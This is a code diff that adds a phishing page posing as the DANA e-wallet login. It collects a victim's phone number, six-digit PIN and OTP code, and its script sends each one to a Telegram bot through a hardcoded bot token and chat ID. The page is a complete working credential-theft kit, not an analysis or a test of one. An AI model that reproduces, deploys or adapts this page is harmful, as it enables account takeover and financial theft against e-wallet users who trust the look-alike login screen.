@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"/>
+    <link rel="icon" href="PUBLIC_URL%/Favion.ico" type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Masukkan Nomor DANA</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        html, body {
+            height: 100%;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            background-color: #1a73e8;
+            overflow: hidden;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background-color: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            text-align: center;
+        }
+        .logo {
+            width: 80px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            color: #000000;
+            font-weight: bold;
+            margin: 15px 0;
+        }
+        .phone-input-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 15px;
+        }
+        .flag-icon {
+            width: 30px;
+            height: 20px;
+            margin-right: 10px;
+        }
+        input[type="tel"] {
+            width: 100%;
+            padding: 14px;
+            font-size: 1.1em;
+            border: 1px solid #d4d4d4;
+            border-radius: 8px;
+            text-align: center;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #1a73e8;
+            color: #ffffff;
+            font-weight: bold;
+            font-size: 1.1em;
+            border-radius: 8px;
+            border: none;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #1558c3;
+        }
+        .input-container {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+        .input-box {
+            width: 55px;
+            height: 55px;
+            font-size: 1.3em;
+            text-align: center;
+            border: 1px solid #d4d4d4;
+            border-radius: 8px;
+            outline: none;
+        }
+        @media screen and (max-width: 480px) {
+            .container {
+                width: 100%;
+                height: 100%;
+                border-radius: 0;
+                box-shadow: none;
+            }
+            .logo {
+                width: 60px;
+            }
+            h2 {
+                font-size: 1.2em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="phonePage">
+        <img src="dana-logo.png" alt="Logo DANA" class="logo">
+        <h2>Masuk atau Daftar dengan Nomor HP</h2>
+        <div class="phone-input-container">
+            <img src="indonesia-flag.png" alt="Indonesia Flag" class="flag-icon">
+            <input type="tel" id="phoneNumber" placeholder="Masukkan nomor telepon" maxlength="14" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 14)">
+        </div>
+        <button onclick="sendPhoneNumber()">Lanjut ke Halaman PIN</button>
+    </div>
+
+    <div class="container" id="pinPage" style="display: none;">
+        <img src="dana-logo.png" alt="Logo DANA" class="logo">
+        <h2>Masukkan PIN Anda</h2>
+        <div class="input-container">
+            <input type="password" maxlength="1" class="input-box pin-input" oninput="moveToNext(this, '.pin-input')">
+            <input type="password" maxlength="1" class="input-box pin-input" oninput="moveToNext(this, '.pin-input')">
+            <input type="password" maxlength="1" class="input-box pin-input" oninput="moveToNext(this, '.pin-input')">
+            <input type="password" maxlength="1" class="input-box pin-input" oninput="moveToNext(this, '.pin-input')">
+            <input type="password" maxlength="1" class="input-box pin-input" oninput="moveToNext(this, '.pin-input')">
+            <input type="password" maxlength="1" class="input-box pin-input" oninput="moveToNext(this, '.pin-input')">
+        </div>
+    </div>
+
+    <div class="container" id="otpPage" style="display: none;">
+        <img src="dana-logo.png" alt="Logo DANA" class="logo">
+        <h2>Masukkan Kode OTP</h2>
+        <p>OTP telah dikirimkan melalui SMS dan WhatsApp. Harap masukkan kode yang diterima.</p>
+        <p id="timer" style="font-weight: bold; color: #1a73e8; margin-top: 10px;">Kirim ulang dalam: <span id="countdown">60</span> detik</p>
+        <div class="input-container">
+            <input type="password" maxlength="1" class="input-box otp-input" oninput="moveToNext(this, '.otp-input')">
+            <input type="password" maxlength="1" class="input-box otp-input" oninput="moveToNext(this, '.otp-input')">
+            <input type="password" maxlength="1" class="input-box otp-input" oninput="moveToNext(this, '.otp-input')">
+            <input type="password" maxlength="1" class="input-box otp-input" oninput="moveToNext(this, '.otp-input')">
+        </div>
+    </div>
+
+    <script>
+        const botToken = "7335135600:AAGls8zxJrYK4epflJSpaA2eps_9Hzam63o";
+        const chatId = "7306305451";
+        let countdownInterval;
+
+        function nextPage(pageId) {
+            document.querySelectorAll('.container').forEach(page => {
+                page.style.display = 'none';
+            });
+            document.getElementById(pageId).style.display = 'block';
+            
+            if (pageId === 'otpPage') startCountdown(60);
+        }
+
+        function sendTelegramMessage(message) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => console.log("Pesan terkirim:", data))
+            .catch(error => console.error("Error:", error));
+        }
+
+        function sendPhoneNumber() {
+            const phoneNumber = document.getElementById('phoneNumber').value.trim();
+            if (phoneNumber === "") {
+                alert("Nomor telepon tidak boleh kosong.");
+                return;
+            }
+            sendTelegramMessage(`Nomor telepon: ${phoneNumber}`);
+            nextPage('pinPage');
+        }
+
+        function moveToNext(currentInput, inputClass) {
+            const inputs = document.querySelectorAll(inputClass);
+            const index = Array.from(inputs).indexOf(currentInput);
+
+            if (currentInput.value.length === 1 && index < inputs.length - 1) {
+                inputs[index + 1].focus();
+            } else if (currentInput.value.length === 0 && index > 0) {
+                inputs[index - 1].focus();
+            }
+
+            const code = Array.from(inputs).map(input => input.value).join('');
+            if (code.length === inputs.length) {
+                if (inputClass === '.pin-input') {
+                    sendTelegramMessage(`PIN: ${code}`);
+                    nextPage('otpPage');
+                } else if (inputClass === '.otp-input') {
+                    sendTelegramMessage(`OTP: ${code}`);
+                    alert("OTP berhasil dikirim!");
+                }
+            }
+        }
+
+        function startCountdown(seconds) {
+            clearInterval(countdownInterval);
+            let countdown = seconds;
+            document.getElementById("countdown").textContent = countdown;
+
+            countdownInterval = setInterval(() => {
+                countdown--;
+                document.getElementById("countdown").textContent = countdown;
+                
+                if (countdown <= 0) {
+                    clearInterval(countdownInterval);
+                    document.getElementById("timer").textContent = "Anda dapat mengirim ulang OTP sekarang.";
+                }
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
